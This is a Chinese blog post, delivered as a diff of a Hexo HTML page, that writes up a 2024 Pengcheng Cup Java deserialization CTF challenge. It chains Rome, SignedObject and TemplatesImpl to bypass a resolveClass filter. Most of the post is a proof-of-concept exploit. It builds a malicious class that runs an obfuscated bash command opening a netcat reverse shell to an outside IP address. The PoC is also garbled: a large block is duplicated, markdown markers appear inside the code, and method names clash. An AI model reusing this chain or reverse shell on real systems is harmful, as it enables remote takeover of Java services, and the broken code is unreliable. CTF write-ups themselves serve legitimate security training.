@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题目信息   com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd com.backdoor.classes.look#runcmd里看到了jndi。 出题人可能想让sink点是runcmd。 Util这里限制了resolveclass   re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="鹏城杯 2024 java">
+<meta property="og:url" content="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/index.html">
+<meta property="og:site_name" content="Charger0">
+<meta property="og:description" content="题目信息   com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd com.backdoor.classes.look#runcmd里看到了jndi。 出题人可能想让sink点是runcmd。 Util这里限制了resolveclass   re">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112155540909.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/wps2.jpg">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/wps3.jpg">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/wps4.jpg">
+<meta property="article:published_time" content="2024-11-10T19:38:24.000Z">
+<meta property="article:modified_time" content="2024-11-13T09:51:55.477Z">
+<meta property="article:author" content="Charger0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20241112155540909.png">
+
+<link rel="canonical" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>鹏城杯 2024 java | Charger0</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Charger0</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">技术记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024%20java/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Charger0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charger0">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          鹏城杯 2024 java
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-11-11 03:38:24" itemprop="dateCreated datePublished" datetime="2024-11-11T03:38:24+08:00">2024-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-11-13 17:51:55" itemprop="dateModified" datetime="2024-11-13T17:51:55+08:00">2024-11-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/../imgs/$%7Bfiilename%7D/image-20241112155540909.png" alt="image-20241112155540909"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps2.jpg" alt="img"> </p>
+<p>com.backdoor.classes.hello#hashCode调用com.backdoor.classes.hello#eval 调用com.backdoor.classes.look#runcmd</p>
+<p>com.backdoor.classes.look#runcmd里看到了jndi。</p>
+<p>出题人可能想让sink点是runcmd。</p>
+<p>Util这里限制了resolveclass</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps3.jpg" alt="c"> </p>
+<p>resolveclass用二次反序列化绕过</p>
+<p>有rome依赖，用rome进二次反序列化 ，进而Templateimpl</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps4.jpg" alt="img"> </p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">最终poc</span><br><span class="line"></span><br><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">// 创建恶意类</span><br><span class="line">ClassPool classPool = ClassPool.**getDefault**();</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">CtClass ctClass = classPool.makeClass(&quot;d&quot;);</span><br><span class="line">ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,bmMgMTM5LjIyNC4xMzAuMTgzIDEwMDAyIC1lIHNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">// 创建TemplatesImpl对象</span><br><span class="line">Object templateImpl = Class.**forName**(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">**setFiled**(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setFiled**(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span><br><span class="line">ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;rand&quot;));</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(objectBean, &quot;rand&quot;);</span><br><span class="line">ObjectBean expObjectBean = new ObjectBean(Templates.class, templateImpl);</span><br><span class="line">**setFieldValue**(objectBean, &quot;_equalsBean&quot;, new EqualsBean(ObjectBean.class, expObjectBean));</span><br><span class="line"></span><br><span class="line">KeyPairGenerator kpg = KeyPairGenerator.**getInstance**(&quot;DSA&quot;);</span><br><span class="line">kpg.initialize(1024);</span><br><span class="line">KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">SignedObject signedObject=new SignedObject(hashMap, kp.getPrivate(),Signature.**getInstance**(&quot;DSA&quot;));</span><br><span class="line">//Rome</span><br><span class="line">ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;&quot;);</span><br><span class="line">**setFieldValue**(badAttributeValueExpException,&quot;val&quot;,toStringBean);</span><br><span class="line"></span><br><span class="line">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span><br><span class="line">String s = **serialize2Base64**(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">byte[] serializedData = Base64.**getMimeDecoder**().decode(s);</span><br><span class="line">String option = **deserializeData**(serializedData);</span><br><span class="line">return s;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/10/ByteCTF2024_ezauth/" rel="prev" title="bytectf2024 ezauth">
+      <i class="fa fa-chevron-left"></i> bytectf2024 ezauth
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/11/hello-world/" rel="next" title="Hello World">
+      Hello World <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">2.</span> <span class="nav-text">poc</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Charger0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Charger0</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
